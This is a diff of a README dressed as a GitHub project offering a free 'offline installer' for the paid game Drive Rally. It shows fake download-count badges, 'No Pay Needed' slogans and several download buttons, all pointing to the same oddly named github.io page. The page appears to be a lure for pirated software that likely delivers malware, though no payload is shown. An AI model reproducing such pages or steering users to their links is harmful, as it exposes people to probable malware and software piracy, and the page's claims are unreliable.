@@ -1,4 +1,4 @@
-# 🎮 #DRIVE Rally Offline Installer Free [2026]
+# 🎮 Drive Rally Offline Installer Free [2026]
 
 <p align="center">
   <img src="https://img.shields.io/badge/Downloads-60K%2B-F9A825?style=for-the-badge&logo=github" />
@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Type-racing-F9A825?style=for-the-badge&logo=gamepad" />
 </p>
 
-**🎮 #DRIVE Rally Offline Installer Free** — professional offline installer for #DRIVE Rally. Works without internet access during setup, no extra subscriptions required. Download for 2026. **Full offline installation.** No limits. No hidden fees.
+**🎮 Drive Rally Offline Installer Free** — professional offline installer for Drive Rally. Works without internet access during setup, no extra subscriptions required. Download for 2026. **Full offline installation.** No limits. No hidden fees.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -17,8 +17,18 @@
 </p>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?color=F9A825&size=28&center=true&vCenter=true&width=900&lines=🎮+%23DRIVE%20Rally+Offline+Installer;⭐+Professional+Grade+Software;🌟+Full+Offline+Installation+2026;🔥+No+Pay+Needed" />
+  <img src="https://readme-typing-svg.herokuapp.com?color=F9A825&size=28&center=true&vCenter=true&width=900&lines=🎮+Drive%20Rally+Offline+Installer;⭐+Professional+Grade+Software;🌟+Full+Offline+Installation+2026;🔥+No+Pay+Needed" />
 </p>
+
+<p align="center">
+  <img src="https://cdn.akamai.steamstatic.com/steam/apps/1869760/header.jpg" alt="Drive Rally" width="460"/>
+</p>
+
+<div align="center">
+
+[![Download](https://img.shields.io/badge/⬇_Download_Drive%20Rally-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
+
+</div>
 
 ---
 
@@ -31,7 +41,7 @@
 
 ---
 
-## ✅ Solution: #DRIVE Rally Offline Installer Free
+## ✅ Solution: Drive Rally Offline Installer Free
 
 | **Problem** | **Solution** |
 |-------------|--------------|
@@ -47,10 +57,6 @@
 
 ### Step 1: Download
 
-<p align="center">
-  <img src="https://cdn.akamai.steamstatic.com/steam/apps/2061980/header.jpg" alt="#DRIVE Rally" width="460"/>
-</p>
-
 <div align="center">
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
@@ -64,13 +70,7 @@
 
 ### Step 2: Install and launch
 
-- Run the installer → Follow instructions → Launch #DRIVE Rally
-
-<div align="center">
-
-[![Download](https://img.shields.io/badge/⬇_Download_%23DRIVE%20Rally-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
-
-</div>
+- Run the installer → Follow instructions → Launch Drive Rally
 
 ---
 
